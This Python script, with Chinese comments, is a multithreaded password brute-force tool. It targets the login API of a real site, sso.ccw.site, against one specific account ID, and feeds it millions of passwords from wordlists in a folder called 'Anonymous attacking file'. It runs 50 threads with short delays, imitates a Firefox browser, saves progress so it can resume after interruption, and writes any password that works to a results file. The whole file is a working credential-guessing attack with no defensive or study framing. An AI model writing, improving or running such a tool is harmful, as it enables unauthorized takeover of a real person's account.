import requests
import json
import time
import os
import threading
import queue
import random
import logging
import pickle
import atexit
import signal
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bruteforce.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# 目标 URL
url = "https://sso.ccw.site/web/auth/login-by-password"

# 密码文件路径列表
password_files = [
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/38650-username-sktorrent.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/1000000-password-seclists.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/2151220-passwords.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/indo-cities.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/8-more-passwords.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/7-more-passwords.txt"
]

# 登录密钥
login_key = "197818033"

# 创建密码队列
password_queue = queue.Queue()
success_passwords = []
lock = threading.Lock()

# 全局计数器
attempt_count = 0
attempt_lock = threading.Lock()

# 进度文件
PROGRESS_FILE = "progress_state.pkl"
SAVE_INTERVAL = 60  # 每60秒保存一次进度

# 性能统计
performance_stats = {
    'requests_sent': 0,
    'successful_responses': 0,
    'failed_responses': 0,
    'start_time': time.time(),
    'last_save_time': time.time()
}

# 退出标志
exit_flag = False

# 会话管理器
class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
    
    def get_session(self, thread_id):
        with self.lock:
            if thread_id not in self.sessions:
                self.sessions[thread_id] = self.create_session()
            return self.sessions[thread_id]
    
    def create_session(self):
        """创建带有重试机制的请求会话"""
        session = requests.Session()
        
        # 设置重试策略
        retry_strategy = Retry(
            total=2,  # 减少重试次数以提高速度
            backoff_factor=0.1,  # 减少退避因子
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST"]
        )
        
        # 创建适配器并设置超时
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,  # 增加连接池大小
            pool_maxsize=100
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

# 创建会话管理器
session_manager = SessionManager()

# 读取密码文件
def load_passwords():
    """从所有密码文件中读取密码并放入队列"""
    total_passwords = 0
    
    for file_path in password_files:
        if not os.path.exists(file_path):
            logger.warning(f"文件不存在 - {file_path}")
            continue
            
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if password:
                        password_queue.put(password)
                        total_passwords += 1
                        
                        # 每加载10000个密码打印一次进度
                        if total_passwords % 10000 == 0:
                            logger.info(f"已加载 {total_passwords} 个密码...")
                
                logger.info(f"已加载 {total_passwords} 个密码从 {os.path.basename(file_path)}")
                
        except Exception as e:
            logger.error(f"读取文件 {file_path} 时出错: {e}")
    
    logger.info(f"总共加载了 {total_passwords} 个密码")
    return total_passwords

# 尝试登录
def try_login(password, attempt_num, thread_id):
    """尝试使用给定的密码进行登录"""
    session = session_manager.get_session(thread_id)
    
    # 准备请求数据
    json_data = {
        "clientCode": "STUDY_COMMUNITY",
        "extra": {
            "device": "Mac OS 10.15",
            "browser": "Firefox 141",
            "scene": None
        },
        "loginKey": login_key,
        "password": password
    }
    
    # 设置请求头
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://ccw.site",
        "Connection": "keep-alive",
        "Referer": "https://ccw.site/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    
    try:
        # 动态调整超时时间
        timeout = 5 + random.randint(0, 3)  # 减少超时时间
        
        # 发送 POST 请求
        start_time = time.time()
        response = session.post(
            url, 
            json=json_data,
            headers=headers,
            timeout=timeout
        )
        request_time = time.time() - start_time
        
        # 更新性能统计
        with lock:
            performance_stats['requests_sent'] += 1
        
        # 检查响应状态
        if response.status_code == 200:
            result = response.json()
            if result.get("code") == "0000000" and result.get("status") == 1:
                with lock:
                    success_passwords.append((login_key, password, result))
                    performance_stats['successful_responses'] += 1
                return True, password, result, request_time
            else:
                # 输出错误信息
                error_msg = result.get("msg", "未知错误")
                logger.info(f"第 {attempt_num} 次尝试 - 密码: {password} - 错误: {error_msg} - 耗时: {request_time:.2f}s")
                return False, password, None, request_time
        else:
            logger.info(f"第 {attempt_num} 次尝试 - 密码: {password} - HTTP错误: {response.status_code} - 耗时: {request_time:.2f}s")
            with lock:
                performance_stats['failed_responses'] += 1
            return False, password, None, request_time
            
    except requests.exceptions.RequestException as e:
        logger.info(f"第 {attempt_num} 次尝试 - 密码: {password} - 请求异常: {e}")
        with lock:
            performance_stats['failed_responses'] += 1
        return False, password, None, 0

# 工作线程函数
def worker(thread_id):
    """工作线程，从队列中获取密码并尝试登录"""
    global attempt_count
    
    # 线程特定的延迟计数器
    error_count = 0
    consecutive_errors = 0
    
    while not password_queue.empty() and not exit_flag:
        try:
            password = password_queue.get_nowait()
            
            # 更新尝试计数器
            with attempt_lock:
                attempt_count += 1
                current_attempt = attempt_count
            
            # 尝试登录
            success, pwd, result, request_time = try_login(password, current_attempt, thread_id)
            
            if success:
                logger.info(f"成功! 登录密钥: {login_key}, 密码: {pwd}")
                # 保存成功结果到文件
                save_success_result(login_key, pwd, result)
                # 重置错误计数
                error_count = 0
                consecutive_errors = 0
            else:
                # 增加错误计数
                error_count += 1
                consecutive_errors += 1
            
            # 动态调整延迟 - 固定在10-30毫秒之间
            base_delay = random.uniform(0.01, 0.03)  # 10-30毫秒
            
            # 错误惩罚 - 轻微增加延迟
            error_penalty = min(error_count * 0.001, 0.01)  # 最大增加10毫秒
            consecutive_penalty = min(consecutive_errors * 0.002, 0.02)  # 最大增加20毫秒
            
            total_delay = base_delay + error_penalty + consecutive_penalty
            
            # 如果连续错误太多，稍微增加延迟
            if consecutive_errors > 50:
                total_delay += 0.05  # 增加50毫秒
                logger.warning(f"线程 {thread_id} 连续错误 {consecutive_errors} 次，增加延迟至 {total_delay:.3f}秒")
            elif consecutive_errors > 20:
                total_delay += 0.02  # 增加20毫秒
            
            time.sleep(total_delay)
            
        except queue.Empty:
            break
        except Exception as e:
            logger.error(f"线程 {thread_id} 处理密码时出错: {e}")
            # 发生异常时稍微增加延迟
            time.sleep(0.1 + random.uniform(0, 0.1))

# 保存成功结果
def save_success_result(login_key, password, result, output_file="success_results.txt"):
    """将成功的登录尝试保存到文件"""
    try:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"登录密钥: {login_key}\n")
            f.write(f"密码: {password}\n")
            f.write(f"响应: {json.dumps(result, ensure_ascii=False)}\n")
            f.write("-" * 50 + "\n")
    except Exception as e:
        logger.error(f"保存结果时出错: {e}")

# 保存进度
def save_progress():
    """保存当前进度到文件"""
    try:
        progress_data = {
            'attempt_count': attempt_count,
            'remaining_passwords': list(password_queue.queue),
            'success_passwords': success_passwords,
            'performance_stats': performance_stats,
            'timestamp': datetime.now().timestamp()
        }
        
        with open(PROGRESS_FILE, 'wb') as f:
            pickle.dump(progress_data, f)
            
        # 同时保存文本格式的进度（可选）
        with open("progress_attempt.txt", "w") as f:
            f.write(f"{attempt_count}\n")
        
        with open("progress_queue.txt", "w") as f:
            for password in progress_data['remaining_passwords']:
                f.write(f"{password}\n")
                
        performance_stats['last_save_time'] = time.time()
        logger.info(f"进度已保存: 已尝试 {attempt_count} 次, 剩余 {len(progress_data['remaining_passwords'])} 个密码")
    except Exception as e:
        logger.error(f"保存进度时出错: {e}")

# 加载进度
def load_progress():
    """从文件加载进度"""
    global attempt_count, success_passwords, performance_stats
    
    try:
        if os.path.exists(PROGRESS_FILE):
            with open(PROGRESS_FILE, 'rb') as f:
                progress_data = pickle.load(f)
                
            # 清空当前队列并重新填充
            with password_queue.mutex:
                password_queue.queue.clear()
                
            for password in progress_data.get('remaining_passwords', []):
                password_queue.put(password)
                
            attempt_count = progress_data.get('attempt_count', 0)
            success_passwords = progress_data.get('success_passwords', [])
            performance_stats.update(progress_data.get('performance_stats', {}))
            
            logger.info(f"从进度恢复: 已尝试 {attempt_count} 次, 剩余 {len(progress_data.get('remaining_passwords', []))} 个密码")
            return attempt_count
    except Exception as e:
        logger.error(f"加载进度时出错: {e}")
        # 尝试从文本格式恢复
        return load_text_progress()
    
    return 0

def load_text_progress():
    """从文本格式恢复进度（备用方法）"""
    global attempt_count
    
    try:
        if os.path.exists("progress_attempt.txt"):
            with open("progress_attempt.txt", "r") as f:
                attempt_count = int(f.readline().strip())
                
        if os.path.exists("progress_queue.txt"):
            with open("progress_queue.txt", "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
                for password in passwords:
                    password_queue.put(password)
                    
            logger.info(f"从文本进度恢复: 已尝试 {attempt_count} 次, 剩余 {len(passwords)} 个密码")
            return attempt_count
    except Exception as e:
        logger.error(f"加载文本进度时出错: {e}")
    
    return 0

# 定期保存进度
def save_progress_periodically():
    """定期保存进度"""
    if not exit_flag:
        save_progress()
        # 重新设置定时器
        timer = threading.Timer(SAVE_INTERVAL, save_progress_periodically)
        timer.daemon = True
        timer.start()

# 显示性能统计
def show_performance_stats():
    """显示性能统计信息"""
    elapsed_time = time.time() - performance_stats['start_time']
    hours = int(elapsed_time // 3600)
    minutes = int((elapsed_time % 3600) // 60)
    seconds = int(elapsed_time % 60)
    
    requests_per_second = performance_stats['requests_sent'] / elapsed_time if elapsed_time > 0 else 0
    
    logger.info("\n" + "="*50)
    logger.info("性能统计:")
    logger.info(f"运行时间: {hours:02d}:{minutes:02d}:{seconds:02d}")
    logger.info(f"总请求数: {performance_stats['requests_sent']}")
    logger.info(f"成功响应: {performance_stats['successful_responses']}")
    logger.info(f"失败响应: {performance_stats['failed_responses']}")
    logger.info(f"请求速率: {requests_per_second:.2f} 请求/秒")
    logger.info(f"当前队列大小: {password_queue.qsize()}")
    logger.info("="*50 + "\n")

# 信号处理函数
def signal_handler(sig, frame):
    """处理中断信号"""
    global exit_flag
    logger.info("接收到中断信号，正在停止程序...")
    exit_flag = True
    save_progress()
    # 等待一段时间让线程有机会退出
    time.sleep(2)
    os._exit(0)

# 主函数
def main():
    global exit_flag
    
    # 注册退出处理
    atexit.register(save_progress)
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # 加载进度
    start_from = load_progress()
    
    # 如果没有从进度恢复，则加载密码文件
    if password_queue.empty():
        total_passwords = load_passwords()
        if total_passwords == 0:
            logger.error("没有加载到任何密码，程序退出")
            return
    else:
        total_passwords = password_queue.qsize() + attempt_count
        logger.info(f"从存档恢复，总共需要尝试 {total_passwords} 个密码")
    
    logger.info(f"开始尝试 {total_passwords} 个密码...")
    logger.info("按 Ctrl+C 可以中断程序")
    
    # 设置定期保存
    progress_timer = threading.Timer(SAVE_INTERVAL, save_progress_periodically)
    progress_timer.daemon = True
    progress_timer.start()
    
    # 使用更多线程加速
    num_threads = 50  # 增加线程数以提高速度
    threads = []
    
    try:
        # 创建并启动线程
        for i in range(num_threads):
            thread = threading.Thread(target=worker, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # 定期显示性能统计
        last_stats_time = time.time()
        while any(thread.is_alive() for thread in threads) and not exit_flag:
            time.sleep(1)
            if time.time() - last_stats_time > 300:  # 每5分钟显示一次统计
                show_performance_stats()
                last_stats_time = time.time()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join(timeout=1)
            
    except KeyboardInterrupt:
        logger.info("\n用户中断了程序")
        exit_flag = True
        # 保存当前进度
        save_progress()
    
    # 取消进度保存定时器
    progress_timer.cancel()
    
    # 计算最终统计信息
    show_performance_stats()
    
    # 输出成功结果
    if success_passwords:
        logger.info("\n成功密码列表:")
        for login_key, password, result in success_passwords:
            logger.info(f"登录密钥: {login_key}, 密码: {password}")
    else:
        logger.info("\n未找到有效密码")

if __name__ == "__main__":
    main()